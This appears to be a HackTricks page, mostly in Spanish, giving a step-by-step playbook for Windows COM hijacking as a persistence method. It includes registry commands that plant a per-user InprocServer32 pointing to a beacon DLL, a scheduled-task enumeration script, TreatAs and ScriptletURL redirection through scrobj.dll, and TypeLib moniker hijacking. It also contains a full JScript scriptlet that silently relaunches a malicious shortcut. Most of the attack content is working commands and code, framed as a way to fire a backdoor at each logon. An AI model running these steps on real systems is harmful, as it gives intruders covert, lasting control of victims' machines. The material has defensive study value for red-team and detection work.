# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Buscando componentes COM inexistentes

Como los valores de HKCU pueden ser modificados por los usuarios, **COM Hijacking** podría usarse como un **mecanismo de persistencia**. Usando `procmon` es fácil encontrar registros COM buscados que aún no existen y que podrían ser creados por un atacante. Filtros clásicos:

- **RegOpenKey** operaciones.
- donde el _Result_ es **NAME NOT FOUND**.
- y el _Path_ termina con **InprocServer32**.

Variaciones útiles durante la búsqueda:

- También busca claves faltantes **`LocalServer32`**. Algunas clases COM son servidores fuera de proceso y lanzarán un EXE controlado por el atacante en lugar de una DLL.
- Busca operaciones de registro **`TreatAs`** y **`ScriptletURL`** además de `InprocServer32`. El contenido reciente de detección y los writeups de malware siguen señalándolos porque son mucho más raros que los registros COM normales y, por lo tanto, de alta señal.
- Copia el legítimo **`ThreadingModel`** del `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` original cuando clones un registro en HKCU. Usar el modelo incorrecto a menudo rompe la activación y hace que el hijack sea ruidoso.
- En sistemas de 64 bits inspecciona ambas vistas de 64 y 32 bits (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` y `HKLM\Software\Classes\WOW6432Node`) porque las aplicaciones de 32 bits pueden resolver un registro COM diferente.

Una vez que hayas decidido qué COM inexistente suplantar, ejecuta los siguientes comandos. _Ten cuidado si decides suplantar un COM que se carga cada pocos segundos, ya que eso podría ser excesivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM secuestrables del Programador de tareas

Las tareas de Windows usan Custom Triggers para llamar a objetos COM y, al ejecutarse mediante el Programador de tareas, es más fácil prever cuándo se van a activar.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Al revisar la salida puedes seleccionar uno que se ejecutará, por ejemplo, **cada vez que un usuario inicie sesión**.

Ahora, buscando el CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** en **HKEY\CLASSES\ROOT\CLSID** y en HKLM y HKCU, normalmente descubrirás que el valor no existe en HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Then, you can just create the HKCU entry and every time the user logs in, your backdoor will be fired.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permite que un CLSID sea emulado por otro. Desde una perspectiva ofensiva, esto significa que puedes dejar el CLSID original intacto, crear un segundo CLSID por usuario que apunte a scrobj.dll, y luego redirigir el objeto COM real al malicioso con `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

This is useful when:

- la aplicación objetivo ya instancia un CLSID estable al iniciar sesión o al arrancar la aplicación
- quieres una redirección solo en el registro en lugar de reemplazar el original InprocServer32
- quieres ejecutar un scriptlet `.sct` local o remoto a través del valor `ScriptletURL`

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notas:

- `scrobj.dll` lee el valor `ScriptletURL` y ejecuta el `.sct` referenciado, por lo que puedes mantener el payload como un archivo local o descargarlo remotamente vía HTTP/HTTPS.
- `TreatAs` es especialmente útil cuando el registro COM original está completo y estable en HKLM, porque solo necesitas un pequeño redireccionamiento por usuario en vez de replicar todo el árbol.
- Para validar sin esperar al trigger natural, puedes instanciar manualmente el ProgID/CLSID falso con `rundll32.exe -sta <ProgID-or-CLSID>` si la clase objetivo soporta activación STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definen interfaces COM y se cargan mediante `LoadTypeLib()`. Cuando se instancia un servidor COM, el SO también puede cargar la TypeLib asociada consultando las claves del registro bajo `HKCR\TypeLib\{LIBID}`. Si la ruta de la TypeLib se reemplaza con un **moniker**, p. ej. `script:C:\...\evil.sct`, Windows ejecutará el scriptlet cuando se resuelva la TypeLib – produciendo una persistencia sigilosa que se activa cuando se tocan componentes comunes.

Esto se ha observado contra el Microsoft Web Browser control (frecuentemente cargado por Internet Explorer, aplicaciones que incrustan WebBrowser e incluso `explorer.exe`).

### Steps (PowerShell)

1) Identifica la TypeLib (LIBID) usada por un CLSID de alta frecuencia. Ejemplo de CLSID frecuentemente abusado por cadenas de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Apunte la ruta TypeLib por usuario a un scriptlet local usando el moniker `script:` (no se requieren privilegios de administrador):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Deja un `.sct` JScript mínimo que vuelva a ejecutar tu payload principal (p. ej. un `.lnk` usado por la cadena inicial):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Activación – abrir IE, una aplicación que incrusta el WebBrowser control, o incluso la actividad rutinaria del Explorer cargará el TypeLib y ejecutará el scriptlet, rearmando tu cadena en el inicio de sesión/reinicio.

Limpieza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notas
- Puedes aplicar la misma lógica a otros componentes COM de alta frecuencia; siempre resuelve primero el `LIBID` real desde `HKCR\CLSID\{CLSID}\TypeLib`.
- En sistemas de 64 bits también puedes poblar la subclave `win64` para consumidores de 64 bits.

## Referencias

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
